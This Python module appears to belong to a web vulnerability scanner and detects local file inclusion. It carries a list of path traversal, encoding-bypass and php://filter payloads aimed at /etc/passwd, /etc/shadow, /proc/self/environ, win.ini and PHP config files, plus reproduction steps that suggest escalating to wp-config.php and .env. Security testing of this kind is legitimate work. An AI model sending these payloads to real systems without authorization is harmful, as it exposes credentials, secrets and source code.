"""Local File Inclusion (LFI) detection module.

Detection strategy:
  1. Path traversal — inject classic ``../`` sequences targeting ``/etc/passwd``
     and ``windows/win.ini``, then validate by matching known file content patterns.
  2. PHP filter wrapper — use ``php://filter/convert.base64-encode/resource=``
     to read PHP source files; validate by base64-decoding and checking for ``<?php``.
  3. Encoding bypass variants — URL-encoded, double-encoded, and mixed-slash
     paths to defeat naive filters.
"""

import base64
import re
from typing import Dict, List, Optional

import logging

from .base import BaseModule, Finding
from ..parser import build_curl_command, inject_into_params, rebuild_url_with_params

logger = logging.getLogger("vulnscanner")

# ---------------------------------------------------------------------------
# Content signatures that confirm a successful file read
# ---------------------------------------------------------------------------
_FILE_SIGS = {
    "/etc/passwd": [
        r"root:x?:0:0:",
        r"root:[^:]*:[^:]*:[^:]*:",
        r"\w+:\w*:\d+:\d+:[^:]*:[^:]*:/\w+",  # generic passwd line
        r"daemon:",
        r"nobody:x:",
        r"bin:/bin",
    ],
    "windows/win.ini": [
        r"\[fonts\]",
        r"\[extensions\]",
        r"for 16-bit app support",
        r"\[mci extensions\]",
    ],
    "/proc/version": [
        r"Linux version",
        r"gcc version",
    ],
}

# ---------------------------------------------------------------------------
# Payload list
# ---------------------------------------------------------------------------
_LFI_PAYLOADS = [
    # ---- Unix path traversal ----
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    # Absolute paths
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/version",
    # ---- Windows path traversal ----
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
    # ---- Null byte injection (legacy PHP < 5.3.4) ----
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    "../../../etc/passwd%00.jpg",
    # ---- URL-encoded traversal ----
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # ---- Double URL-encoded ----
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # ---- Filter bypass with extra dots/slashes ----
    "....//....//....//etc/passwd",
    "..././..././..././etc/passwd",
    "....\\....\\....\\etc\\passwd",
    # ---- PHP wrappers ----
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../index.php",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=config.php",
    # ---- Common log / config files ----
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/www/html/index.php",
]


class LFIScanner(BaseModule):
    """Detects LFI via path traversal, PHP wrappers, and encoding bypass payloads."""

    NAME = "lfi"

    def __init__(self, http_client, config: Dict) -> None:
        super().__init__(http_client, config)
        self.custom_payloads: Optional[str] = config.get("custom_payloads")

    # ------------------------------------------------------------------
    # Public entry-point
    # ------------------------------------------------------------------

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        """Test *param_name* for LFI using the full payload list."""
        payloads = self.load_payloads(_LFI_PAYLOADS, self.custom_payloads)

        for payload in payloads:
            injected = inject_into_params(params, param_name, payload)
            if method == "GET":
                resp = self.http.get(rebuild_url_with_params(url, injected))
            else:
                resp = self.http.post(url, data=injected)

            if resp is None:
                continue

            finding = self._validate(resp.text, payload, url, method, params, param_name)
            if finding:
                return [finding]

        return []

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _validate(
        self,
        body: str,
        payload: str,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Optional[Finding]:
        """Check the response body for file-read evidence."""

        # PHP filter wrapper — expect base64-encoded source
        if "php://filter" in payload.lower() and "base64-encode" in payload.lower():
            finding = self._check_php_filter(body, payload, url, method, params, param_name)
            if finding:
                return finding

        # Known file content signatures
        for target_file, patterns in _FILE_SIGS.items():
            for pattern in patterns:
                if re.search(pattern, body):
                    snippet = self._snippet_around(body, pattern)
                    logger.debug(
                        "[LFI] %s=%r matched signature for %s",
                        param_name, payload, target_file,
                    )
                    curl = build_curl_command(url, method, params, param_name, payload)
                    return Finding(
                        vuln_type="Local File Inclusion (LFI)",
                        url=url,
                        method=method,
                        parameter=param_name,
                        payload=payload,
                        evidence=(
                            f"File content signature of {target_file!r} found: "
                            f"...{snippet!r}..."
                        ),
                        confidence="high",
                        details=(
                            f"Successful path traversal reading {target_file!r}. "
                            f"Signature pattern: {pattern!r}. "
                            "Remediation: validate/restrict file path inputs; "
                            "use an allow-list for permitted resources."
                        ),
                        reproduction=(
                            f"# 1. Send the path traversal payload:\n"
                            f"{curl}\n"
                            f"# 2. Search for file content signatures in the response:\n"
                            f"$ # Grep for: {pattern}\n"
                            f"# 3. If content from {target_file} appears (e.g. 'root:x:0:0:'),\n"
                            f"#    the server is reading arbitrary files via path traversal.\n"
                            f"# 4. Escalate: try reading sensitive config files:\n"
                            f"#    Linux:   /etc/shadow, /proc/self/environ, /var/log/auth.log\n"
                            f"#    Windows: C:\\boot.ini, C:\\inetpub\\logs\\LogFiles\n"
                            f"#    Web:     ../config.php, ../wp-config.php, ../.env"
                        ),
                    )

        return None

    @staticmethod
    def _check_php_filter(
        body: str,
        payload: str,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Optional[Finding]:
        """Try to base64-decode large blobs in the response and look for PHP code."""
        b64_re = re.compile(r"[A-Za-z0-9+/]{60,}={0,2}")
        for match in b64_re.finditer(body):
            blob = match.group(0)
            # Pad to multiple of 4
            blob += "=" * (-len(blob) % 4)
            try:
                decoded = base64.b64decode(blob).decode("utf-8", errors="replace")
            except Exception:
                continue

            if "<?php" in decoded or "<?" in decoded[:20]:
                preview = decoded[:200].replace("\n", "\\n")
                logger.debug(
                    "[LFI/PHP-Filter] %s: base64 PHP source decoded", param_name
                )
                curl = build_curl_command(url, method, {param_name: payload}, param_name, payload)
                return Finding(
                    vuln_type="Local File Inclusion (LFI — PHP Filter)",
                    url=url,
                    method=method,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"PHP source decoded from base64: {preview!r}",
                    confidence="high",
                    details=(
                        "php://filter wrapper successfully read and base64-encoded a PHP "
                        f"source file. Decoded preview: {preview[:120]!r}. "
                        "Remediation: disable php:// stream wrappers for user input; "
                        "whitelist allowed resources."
                    ),
                    reproduction=(
                        f"# 1. Send the php://filter payload to extract source code:\n"
                        f"{curl}\n"
                        f"# 2. Copy the base64 blob from the response and decode it:\n"
                        f"$ echo '<base64_blob>' | base64 -d\n"
                        f"# 3. If you see PHP source code (<?php), the server is reading\n"
                        f"#    files via the php://filter wrapper (LFI confirmed).\n"
                        f"# 4. Escalate: read sensitive files:\n"
                        f"#    php://filter/convert.base64-encode/resource=config.php\n"
                        f"#    php://filter/convert.base64-encode/resource=../wp-config.php\n"
                        f"#    php://filter/convert.base64-encode/resource=.env"
                    ),
                )
        return None

    @staticmethod
    def _snippet_around(body: str, pattern: str, radius: int = 80) -> str:
        """Return a short excerpt surrounding the first match of *pattern*."""
        m = re.search(pattern, body)
        if not m:
            return ""
        s = max(0, m.start() - 20)
        e = min(len(body), m.end() + radius)
        return body[s:e].replace("\n", "\\n")
